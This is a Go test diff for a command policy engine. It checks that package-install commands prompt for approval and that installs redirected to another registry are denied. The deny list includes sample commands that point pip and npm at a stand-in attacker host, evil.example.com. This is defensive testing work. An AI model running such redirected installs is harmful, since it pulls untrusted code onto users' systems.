@@ -62,3 +62,34 @@ func TestDownloadPipeShellDenied(t *testing.T) {
 		t.Errorf("plain download -> %+v, want nil", v)
 	}
 }
+
+func TestPackageInstallAsk(t *testing.T) {
+	pol := netPol()
+	ask := []string{
+		"pip install requests", "pip3 install -r requirements.txt",
+		"npm install left-pad", "npm i left-pad", "npm ci", "yarn add lodash", "pnpm add lodash",
+		"gem install rails", "cargo install ripgrep", "go install golang.org/x/tools/cmd/goimports@latest",
+		"go get github.com/x/y", "apt install curl", "brew install jq",
+	}
+	for _, c := range ask {
+		v := evalNet(t, c, pol)
+		if v == nil || v.Decision != policy.Ask || v.RuleID != "P6.package-install" {
+			t.Errorf("%q -> %+v, want ask/P6.package-install", c, v)
+		}
+	}
+}
+
+func TestRegistryRedirectDenied(t *testing.T) {
+	pol := netPol()
+	deny := []string{
+		"pip install --index-url https://evil.example.com/simple foo",
+		"pip install git+https://example.com/x.git",
+		"npm install --registry https://evil.example.com foo",
+	}
+	for _, c := range deny {
+		v := evalNet(t, c, pol)
+		if v == nil || v.Decision != policy.Deny || v.RuleID != "P6.registry-redirect" {
+			t.Errorf("%q -> %+v, want deny/P6.registry-redirect", c, v)
+		}
+	}
+}
